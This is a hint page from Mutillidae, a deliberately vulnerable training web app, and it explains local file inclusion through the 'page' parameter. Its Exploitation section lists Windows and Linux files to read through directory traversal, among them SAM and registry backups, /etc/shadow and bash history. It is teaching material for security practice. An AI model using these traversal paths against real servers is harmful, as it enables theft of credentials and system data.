			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			Local file inclusion allows an attacker to include file local to the web server
			possibly allowing code execution, denial of service, and data disclosure.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
			<br/><br/>
			<span class="report-header">Discovery Methodology</span>
			<br/><br/>
			The page displayed in Mutillidae is determined
			by the value of the "page" parameter. What would happen the "page"
			parameter was changed to a filename which is on the server but not
			intended to be served? This defect can be combined with other defects.
			For example, the "page" parameter might be able to be passed in via either
			GET or POST due to the parameters pollutition flaw. Using the parent
			traversal operator ("..") can help break out of the web server file
			folders. Also, direct file paths can be tried. For example, if Mutillidae
			is running on a Windows XP system, the following values for "page"
			can be tried.
			<br/><br/>
			<span class="report-header">Exploitation</span>
			<br/><br/>
			On Windows machines try the following (from Mubix post exploitation guide).
			The web server root may be several directories
			down from the system root. Be sure to prefix the file names with directory traversal
			(i.e. - ../../..).
			<br/>
<code>
	C:\boot.ini
	..\..\..\..\boot.ini
	%SYSTEMDRIVE%\pagefile.sys
	%WINDIR%\debug\NetSetup.log
	%WINDIR%\repair\sam
	%WINDIR%\repair\system
	%WINDIR%\repair\software
	%WINDIR%\repair\security
	%WINDIR%\system32\logfiles\w3svc1\exYYMMDD.log (year month day)
	%WINDIR%\system32\config\AppEvent.Evt
	%WINDIR%\system32\config\SecEvent.Evt
	%WINDIR%\system32\config\default.sav
	%WINDIR%\system32\config\security.sav
	%WINDIR%\system32\config\software.sav
	%WINDIR%\system32\config\system.sav
	%WINDIR%\system32\CCM\logs\*.log
	%USERPROFILE%\ntuser.dat
	%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
	%WINDIR%\System32\drivers\etc\hosts
</code>
			<br/>
			On Linux machines try the following. The web server root may be several directories
			down from the system root. Be sure to prefix the file names with directory traversal
			(i.e. - ../../..).
			<br/>
<code>
	/etc/passwd
	/etc/resolv.conf
	/etc/motd
	/etc/issue
	/etc/passwd
	/etc/shadow
	/home/xxx/.bash_history
	/etc/issue{,.net}
	/etc/master.passwd
	/etc/group
	/etc/hosts
	/etc/crontab
	/etc/sysctl.conf
	/etc/resolv.conf
	/etc/syslog.conf
	/etc/chttp.conf
	/etc/lighttpd.conf
	/etc/cups/cupsd.confcda
	/etc/inetd.conf
	/opt/lampp/etc/httpd.conf
	/etc/samba/smb.conf
	/etc/openldap/ldap.conf
	/etc/ldap/ldap.conf
	/etc/exports
	/etc/auto.master
	/etc/auto_master
	/etc/fstab
</code>
<br/><br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisInsecureDirectObjectReferenceIDOR);?>
<br/><br/>
